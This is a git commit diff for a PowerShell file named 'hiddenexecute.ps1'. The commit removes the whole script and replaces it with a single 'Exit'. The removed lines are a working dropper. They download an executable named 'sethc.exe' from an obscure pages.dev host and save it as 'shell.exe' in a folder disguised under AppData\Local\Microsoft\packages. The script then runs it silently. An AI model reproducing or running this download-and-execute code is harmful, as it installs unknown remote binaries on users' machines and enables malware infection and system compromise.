2bd39d3ddf9c5e5a3b4720c89e07ca6e99470900
webntdev <96979468+webntdev@users.noreply.github.com>
2024-05-13 17:28:31 +0300

    Update hiddenexecute.ps1

--- files/hiddenexecute.ps1
+++ files/hiddenexecute.ps1
@@ -1,13 +1,1 @@
-$url = "https://ipnqtxhsbvcmurjolgkfadzwey.pages.dev/files/sethc.exe"
-$folderPath = "$env:USERPROFILE\AppData\Local\Microsoft\packages"
-$localPath = "$folderPath\shell.exe"
-
-if (-Not (Test-Path $folderPath)) {
-    New-Item -ItemType Directory -Path $folderPath
-}
-
-if (-Not (Test-Path $localPath)) {
-    Invoke-WebRequest -Uri $url -OutFile $localPath
-}
-
-Start-Process $localPath
+Exit
